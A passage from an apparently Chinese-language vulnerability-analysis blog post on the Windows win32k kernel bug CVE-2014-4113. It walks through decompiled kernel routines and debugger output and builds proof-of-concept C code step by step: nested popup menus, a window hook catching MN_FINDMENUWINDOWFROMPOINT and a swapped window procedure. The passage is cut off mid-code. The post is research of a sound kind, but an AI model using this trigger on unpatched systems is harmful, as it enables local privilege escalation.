class="line">);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<code>TrackPopupMenu</code>的函数原型，重要的参数hMemu和hWnd，hMenu是菜单句柄，该参数是由CreatePopupMenu生成，hWnd是窗口句柄，hWnd参数是由CreateWindows生成，构建的poc如下，但是这样肯定无法触发漏洞。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ATOM reg = RegisterClassA(<span class="name">&amp;wnd_class</span>)<span class="comment">;</span></div><div class="line">HWND main_wnd = CreateWindowA(<span class="name">wnd_class</span>.lpszClassName, <span class="string">""</span>, WS_OVERLAPPEDWINDOW | WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">640</span>, <span class="number">480</span>, NULL, NULL, wnd_class.hInstance, NULL)<span class="comment">;</span></div><div class="line">HMENU MenuOne = CreatePopupMenu()<span class="comment">;</span></div><div class="line">BOOL insertMenuItem = InsertMenuItemA(<span class="name">MenuOne</span>, <span class="number">0</span>, TRUE, <span class="symbol">&amp;MenuOneInfo</span>)<span class="comment">;</span></div><div class="line">TrackPopupMenu(<span class="name">MenuOne</span>,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，在<code>win32k!xxxHandleMenuMessages</code>打一个断点，接着根据上面分析，漏洞产生原因是没有对位于<code>win32k!xxxHandleMenuMessages+0x99</code>的<code>xxxMNFindWindowFromPoint</code>的返回值进行校验。该地址主要有两个引用点。</p><ul><li><code>win32k!xxxHandleMenuMessages+0x5D</code></li><li><code>win32k!xxxHandleMenuMessages+0x25A</code></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要想触发到<code>v13 = xxxMNFindWindowFromPoint(v3, &amp;tagPopupMenu, v7);</code>主要有两条路径，第一条路径，当发送WM_LBUTTONDOWN(0x201)消息给窗口的时候触发，第二条路径，发送WM_RBUTTONDOWN消息，并且<code>(*tagPopupMenu &amp; 0x40) != 0</code>需要符合这两个条件。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">//第一条路径</div><div class="line">  message = tagMsg-&gt;message;</div><div class="line">  v6 = tagMsg-&gt;wParam;</div><div class="line">  v7 = tagMsg-&gt;lParam;</div><div class="line">  v44 = v6;</div><div class="line">  a3 = v7;</div><div class="line"> <span class="built_in"> if </span>( message &gt; 0x104 )                        // CVE-2014-4113 条件2</div><div class="line">  &#123;</div><div class="line">   <span class="built_in"> if </span>( message &lt;= 0x202 )                     // CVE-2014-4113 条件3</div><div class="line">    &#123;</div><div class="line">     <span class="built_in"> if </span>( message == 0x202 )</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_79;</span></div><div class="line">      v20 = message - 0x105;                    // message = 0xFC + 0x105 = 0x201</div><div class="line">     <span class="built_in"> if </span>( v20 )                                // 条件2&lt;----CVE-2015-2546</div><div class="line">      &#123;</div><div class="line">        v21 = v20 - 1;                          // v20 = 0xFB + 0x1  = 0xFC</div><div class="line">       <span class="built_in"> if </span>( v21 )</div><div class="line">        &#123;</div><div class="line">          v22 = v21 - 0x12;                     // v21 = 0xE9 + 0x12 = 0xFB</div><div class="line">         <span class="built_in"> if </span>( !v22 )</div><div class="line">           <span class="built_in"> return </span>1;</div><div class="line">          v23 = v22 - 0xE8;                     // 0xE8 + 1 = 0xE9</div><div class="line">         <span class="built_in"> if </span>( v23 )</div><div class="line">          &#123;</div><div class="line">           <span class="built_in"> if </span>( v23 == 1 )</div><div class="line">            &#123;</div><div class="line">LABEL_13:</div><div class="line">              v12 = pMenuState;</div><div class="line">              pMenuState[4] = -1;</div><div class="line">              pMenuState[2] = v7;</div><div class="line">              pMenuState[3] = SHIWORD(v7);</div><div class="line">              v13 = xxxMNFindWindowFromPoint(v3, &amp;tagPopupMenu, v7);// &lt;------CVE-2014-4113</div><div class="line">//第二条路径</div><div class="line">      case 0x204u:</div><div class="line">LABEL_12:</div><div class="line">       <span class="built_in"> if </span>( (*tagPopupMenu &amp; 0x40) != 0 )</div><div class="line">         <span class="built_in"> goto </span><span class="class">LABEL_13;</span>                        // &lt;------</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_76;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里详细解释一下<code>(*tagPopupMenu &amp; 0x40) != 0</code>,其汇编代码如下,可以看到tagPOPUPMENU偏移为0的地址和40h进行test。40h的2进制表示为‭01000000‬，这里判断第一个字节是否含有 fRightButton 标志位。所以，在第二条路径上需要满足如下两个条件</p><ul><li>发送WM_RBUTTONDOWN消息</li><li>设置fRightButton标志<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B36                 test    <span class="keyword">byte</span> ptr [edi+tagPOPUPMENU._bf_0], <span class="number">40</span>h</div><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B39                 jz      loc_95AB7E12</div><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B36                 test    <span class="keyword">byte</span> ptr [edi], <span class="number">40</span>h</div><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B39                 jz      loc_95AB7E12</div><div class="line"><span class="comment">//</span></div><div class="line">kd&gt; dt tagPOPUPMENU</div><div class="line">win32k!tagPOPUPMENU</div><div class="line">   +<span class="number">0x000</span> <span class="string">fIsMenuBar       :</span> Pos <span class="number">0</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fHasMenuBar      :</span> Pos <span class="number">1</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fIsSysMenu       :</span> Pos <span class="number">2</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fIsTrackPopup    :</span> Pos <span class="number">3</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDroppedLeft     :</span> Pos <span class="number">4</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fHierarchyDropped :</span> Pos <span class="number">5</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fRightButton     :</span> Pos <span class="number">6</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fToggle          :</span> Pos <span class="number">7</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fSynchronous     :</span> Pos <span class="number">8</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fFirstClick      :</span> Pos <span class="number">9</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDropNextPopup   :</span> Pos <span class="number">10</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fNoNotify        :</span> Pos <span class="number">11</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fAboutToHide     :</span> Pos <span class="number">12</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fShowTimer       :</span> Pos <span class="number">13</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fHideTimer       :</span> Pos <span class="number">14</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDestroyed       :</span> Pos <span class="number">15</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDelayedFree     :</span> Pos <span class="number">16</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fFlushDelayedFree :</span> Pos <span class="number">17</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fFreed           :</span> Pos <span class="number">18</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fInCancel        :</span> Pos <span class="number">19</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fTrackMouseEvent :</span> Pos <span class="number">20</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fSendUninit      :</span> Pos <span class="number">21</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fRtoL            :</span> Pos <span class="number">22</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">iDropDir         :</span> Pos <span class="number">23</span>, <span class="number">5</span> Bits</div><div class="line">   +<span class="number">0x000</span> <span class="string">fUseMonitorRect  :</span> Pos <span class="number">28</span>, <span class="number">1</span> Bit</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何发送消息呢，可以在WndProc函数中调用PostMessage发送消息<code>PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0);</code><br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK WndProc(<span class="keyword">HWND</span> <span class="keyword">hwnd</span>, UINT msg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>) </div><div class="line">&#123;</div><div class="line">printf(<span class="string">"WindProc called with message=%x\n"</span>, msg)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span> (msg == WM_ENTERIDLE) &#123;</div><div class="line">PostMessageA(<span class="keyword">hwnd</span>, WM_KEYDOWN, VK_DOWN, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">PostMessageA(<span class="keyword">hwnd</span>, WM_KEYDOWN, VK_RIGHT, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">PostMessageA(<span class="keyword">hwnd</span>, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0</span>)<span class="comment">; </span></div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> DefWindowProc(<span class="keyword">hwnd</span>, msg, <span class="keyword">wParam</span>, <span class="keyword">lParam</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后进入<code>win32k!xxxMNFindWindowFromPoint</code>中，就像函数名称存在<code>xxx</code>前缀，说明在该函数中存在回调到用户侧的执行逻辑，首先，<code>win32k!xxxMNFindWindowFromPoint</code>会判断是否存在spwndNextPopup的子菜单窗口对象，如果存在子菜单窗口对象，就会调用 xxxSendMessage发送<code>MN_FINDMENUWINDOWFROMPOINT</code>(0x1EB)消息，用来查找菜单窗口对象。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">int  xxxMNFindWindowFromPoint(<span class="name">tagPOPUPMENU</span> *tagpopupmenu, tagPOPUPMENU **a2, unsigned int a3)</div><div class="line">&#123;</div><div class="line">  v3 = a2;</div><div class="line">  *a2 = <span class="number">0</span><span class="comment">;</span></div><div class="line">  tagpopupmenu_ = tagpopupmenu<span class="comment">;</span></div><div class="line">  spwndNextPopup = tagpopupmenu-&gt;spwndNextPopup<span class="comment">;</span></div><div class="line">  if ( <span class="name">spwndNextPopup</span> )                         // v5 不为空</div><div class="line">  &#123;</div><div class="line">    v23[<span class="number">0</span>] = *(gptiCurrent + 45);</div><div class="line">    *(<span class="name">gptiCurrent</span> + <span class="number">45</span>) = v23<span class="comment">;</span></div><div class="line">    v23[<span class="number">1</span>] = spwndNextPopup<span class="comment">;</span></div><div class="line">    ++spwndNextPopup-&gt;head.cLockObj<span class="comment">;</span></div><div class="line">    v6 = xxxSendMessage(<span class="name">tagpopupmenu_-&gt;spwndNextPopup</span>, <span class="number">0</span>x1EB, <span class="symbol">&amp;tagpopupmenu</span>, (<span class="name">a3</span> | (<span class="name">HIWORD</span>(<span class="name">a3</span>) &lt;&lt; <span class="number">16</span>)))<span class="comment">;// 为什么返回值为0xfffffffb</span></div><div class="line">    ThreadUnlock1()<span class="comment">;</span></div><div class="line">    if ( <span class="name">IsMFMWFPWindow</span>(<span class="name">v6</span>) )</div><div class="line">      v6 = HMValidateHandleNoSecure(<span class="name">v6</span>, <span class="number">1</span>)<span class="comment">;     // return 0xfffffffb</span></div><div class="line">    if ( <span class="name">v6</span> )</div><div class="line">    &#123;</div><div class="line">      *v3 = tagpopupmenu;</div><div class="line">      return v6;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">[.....]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMNFindWindowFromPoint</code>用来获取tagWnd对象，该函数首先判断<code>tagpopupmenu</code>对象的spwndNextPopup是否为空，如果不为空的话，就会调用xxxSendMessage对子弹出菜单发送MN_FINDMENUWINDOWFROMPOINT(0x1EB)消息。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">tagpopupmenu_ = tagpopupmenu;</div><div class="line">spwndNextPopup = tagpopupmenu-&gt;spwndNextPopup;</div><div class="line">if ( spwndNextPopup )                         // v5 不为空</div><div class="line">&#123;</div><div class="line">  v23[0] = *(gptiCurrent + 45);</div><div class="line">  *(gptiCurrent + 45) = v23;</div><div class="line">  v23[1] = spwndNextPopup;</div><div class="line">  ++spwndNextPopup-&gt;head.c<span class="class">LockObj;</span></div><div class="line">  v6 = xxxSendMessage(tagpopupmenu_-&gt;spwndNextPopup, 0x1EB, &amp;tagpopupmenu, (a3 | (HIWORD(a3) &lt;&lt; 16)));// 为什么返回值为0xfffffffb</div><div class="line">  ThreadUnlock1();</div><div class="line"> <span class="built_in"> if </span>( IsMFMWFPWindow(v6) )</div><div class="line">    v6 = HMValidateHandleNoSecure(v6, 1);     //<span class="built_in"> return </span>0xfffffffb</div><div class="line"> <span class="built_in"> if </span>( v6 )</div><div class="line">  &#123;</div><div class="line">    *v3 = tagpopupmenu;</div><div class="line">   <span class="built_in"> return </span>v6;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxSendMessage</code>最终调用<code>xxxSendMessageTimeout</code>函数，在<code>xxxSendMessageTimeout</code>中，首先判断发送窗口是否属于当前进程，以及判断是否处于Hook状态，并最终调用<code>win32k!xxxMenuWindowProc</code>。<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">kd&gt; dt <span class="keyword">tag</span>WND fe810650</div><div class="line">win32k!<span class="keyword">tag</span>WND</div><div class="line">   +<span class="number">0</span>x000 head             : _THRDESKHEAD</div><div class="line">   +<span class="number">0</span>x014 <span class="keyword">state</span>            : <span class="number">0</span>x40000</div><div class="line">[...]</div><div class="line">   +<span class="number">0</span>x050 rcClient         : <span class="keyword">tag</span>RECT</div><div class="line">   +<span class="number">0</span>x060 lpfnWndProc      : <span class="number">0</span>x95abdd97     long  win32k!xxxMenuWindowProc+<span class="number">0</span></div><div class="line">[...]</div><div class="line">kd&gt; kn</div><div class="line"> <span class="comment"># ChildEBP RetAddr      </span></div><div class="line"><span class="number">00</span> <span class="number">991</span>c0940 <span class="number">95</span>a44859     win32k!xxxMenuWindowProc</div><div class="line"><span class="number">01</span> <span class="number">991</span>c0980 <span class="number">95</span>a446a4     win32k!xxxSendMessageTimeout+<span class="number">0</span>x1ac</div><div class="line"><span class="number">02</span> <span class="number">991</span>c09a8 <span class="number">959</span>cb88b     win32k!xxxSendMessage+<span class="number">0</span>x28</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMenuWindowProc</code>首先检查了窗口对象的状态，然后根据message执行不同的操作。当message为MN_FINDMENUWINDOWFROMPOINT时，继续将弹出窗口ppopupmenu传入xxxMNFindWindowFromPoint，并最终返回窗口对象。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">case MN_FINDMENUWINDOWFROMPOINT:</div><div class="line">&#123;</div><div class="line">    /*</div><div class="line">     * lParam <span class="keyword">is</span> point <span class="keyword">to</span> search <span class="keyword">for</span> <span class="keyword">from</span> this hierarchy down.</div><div class="line">     * returns MFMWFP_* value <span class="keyword">or</span> a pwnd.</div><div class="line">     */</div><div class="line">    lRet = xxxMNFindWindowFromPoint(ppopupmenu, (PUINT)wParam, MAKEPOINTS(lParam));</div><div class="line">    /*</div><div class="line">     * Convert <span class="literal">return</span> value <span class="keyword">to</span> a handle.</div><div class="line">     */</div><div class="line">    <span class="keyword">if</span> (IsMFMWFPWindow(lRet)) &#123;</div><div class="line"><span class="built_in">        return</span> (LRESULT)HW((PWND)lRet);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">        return</span> lRet;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为<code>spwndNextPopup = tagpopupmenu-&gt;spwndNextPopup;</code>不为空，所以在构造poc的时候需要创建两个菜单对象，新构造的poc如下<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Step1:注册窗口类和创建窗口</span></div><div class="line">ATOM reg = RegisterClassA(&amp;wnd_class);</div><div class="line">HWND main_wnd = CreateWindowA(wnd_class.lpszClassName, <span class="string">""</span>, WS_OVERLAPPEDWINDOW | WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">640</span>, <span class="number">480</span>, NULL, NULL, wnd_class.hInstance, NULL);</div><div class="line"><span class="comment">//Step2:创建第一个菜单</span></div><div class="line">HMENU MenuOne = CreatePopupMenu();</div><div class="line">BOOL insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuOneInfo);</div><div class="line">TrackPopupMenu(MenuOne,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div><div class="line"><span class="comment">//Step3：创建第二个菜单</span></div><div class="line">HMENU MenuTwo = CreatePopupMenu();</div><div class="line">insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuTwoInfo);</div><div class="line"><span class="comment">//Step4：触发漏洞</span></div><div class="line">TrackPopupMenu(MenuTwo,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后，进入<code>win32k!xxxSendMessageTimeout</code>,【在挖一个坑，学习xxxSendMessageTimeout机制】</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>win32k!xxxSendMessageTimeout</code>中调用<code>xxxSendMessageToClient</code>向用户侧发送MN_FINDMENUWINDOWFROMPOINT消息，此时执行流会回调到用户层，从而给了机会销毁菜单对象，从而有了触发漏洞前提。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要想执行流执行<code>xxxSendMessageToClient</code>，需要满足一下几个条件：</p><ul><li>pwnd != -1 (已满足）</li><li>gptiCurrent == pwnd-&gt;head.pti（判断发送的窗口是否属于当前线程）(已满足)</li><li>gptiCurrent-&gt;fsHooks（使用SetWindowsHookEx即可满足）</li><li>ptagWND-&gt;bServerSideWindowProc（满足）</li><li>在0x1EB消息发送后修改快捷菜单的窗口过程(ptagwnd-&gt;lpfnWndProc)（使用SetWindowLongPtr可以满足）</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;继续构造新的poc。使用SetWindowsHookEx添加一个钩子过程。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Step1:注册窗口类和创建窗口</span></div><div class="line">ATOM reg = RegisterClassA(&amp;wnd_class);</div><div class="line">HWND main_wnd = CreateWindowA(wnd_class.lpszClassName, <span class="string">""</span>, WS_OVERLAPPEDWINDOW | WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">640</span>, <span class="number">480</span>, NULL, NULL, wnd_class.hInstance, NULL);</div><div class="line"><span class="comment">//Step2:创建第一个菜单</span></div><div class="line">HMENU MenuOne = CreatePopupMenu();</div><div class="line">BOOL insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuOneInfo);</div><div class="line">TrackPopupMenu(MenuOne,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div><div class="line"><span class="comment">//Step3：创建第二个菜单</span></div><div class="line">HMENU MenuTwo = CreatePopupMenu();</div><div class="line">insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuTwoInfo);</div><div class="line"><span class="comment">//Step5：触发漏洞</span></div><div class="line">TrackPopupMenu(MenuTwo,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;编写钩子处理函数，根据上面分析，<code>xxxMNFindWindowFromPoint</code>调用 <code>xxxSendMessage</code>发送<code>MN_FINDMENUWINDOWFROMPOINT</code>(0x1EB)消息，用来查找菜单窗口对象。所以我们需要钩取<code>MN_FINDMENUWINDOWFROMPOINT</code>消息。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK HookCallback(<span class="keyword">int</span> code, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>) &#123;</div><div class="line">printf(<span class="string">"Callback one called.\n"</span>)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span> (*(DWORD*)(<span class="keyword">lParam</span> + <span class="number">8</span>) == MN_FINDMENUWINDOWFROMPOINT) </div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback)) </div><div class="line">&#123;</div><div class="line">SetWindowLongA(*(<span class="keyword">HWND</span>*)(<span class="keyword">lParam</span> + <span class="number">12</span>), GWLP_WNDPROC, (LONG)HookCallbackTwo)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, code, <span class="keyword">wParam</span>, <span class="keyword">lParam</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;钩子函数原型如下，<code>nCode</code>可以指定挂钩函数是否必须处理消息，<code>wParam</code>表示消息是否可以由当前线程发送，<code>lparam</code>指向的是tagCWPSTRUCT结构体指针。tagCWPSTRUCT结构体第3个成员表示消息类型。可以根据<code>*(DWORD*)(lParam + 8)</code>的值判断消息是否是<code>MN_FINDMENUWINDOWFROMPOINT</code>。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK CallWndProc(</div><div class="line">  _In_ <span class="keyword">int</span>    nCode,</div><div class="line">  _In_ <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>,</div><div class="line">  _In_ <span class="keyword">LPARAM</span> <span class="keyword">lParam</span></div><div class="line">)<span class="comment">;</span></div><div class="line">typedef struct tagCWPSTRUCT &#123;</div><div class="line">  <span class="keyword">LPARAM</span> <span class="keyword">lParam</span><span class="comment">;</span></div><div class="line">  <span class="keyword">WPARAM</span> <span class="keyword">wParam</span><span class="comment">;</span></div><div class="line">  UINT   message<span class="comment">;</span></div><div class="line">  <span class="keyword">HWND</span>   <span class="keyword">hwnd</span><span class="comment">;</span></div><div class="line">&#125; CWPSTRUCT, *PCWPSTRUCT, *NPCWPSTRUCT, *LPCWPSTRUCT<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在窗口钩子的处理函数中，如果处理的消息为<code>MN_FINDMENUWINDOWFROMPOINT</code>,就会调用<code>SetWindowLongA</code>修改菜单的消息处理函数，为什么要这样呢？我理解的是，当使用SetWindowsHook设置的是针对窗口的钩子函数，所以还需要通过<code>SetWindowLongA</code>为菜单对象设置钩子函数。<code>hWnd</code>是指窗口句柄。<code>nIndex</code>是指偏移，选择<code>GWL_WNDPROC</code>为窗口函数设置一个新地址。<code>dwNewLong</code>在这里指的是函数地址。<code>HookCallbackTwo</code>是针对菜单对象的处理函数，在这个函数中需要释放菜单，并且返回-5。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">LONG SetWindowLongA(</div><div class="line">  [in] <span class="keyword">HWND</span> <span class="keyword">hWnd</span>,</div><div class="line">  [in] <span class="keyword">int</span>  nIndex,</div><div class="line">  [in] LONG dwNewLong</div><div class="line">)<span class="comment">;</span></div><div class="line"><span class="comment">//针对菜单对象的处理函数</span></div><div class="line">LRESULT CALLBACK HookCallbackTwo(<span 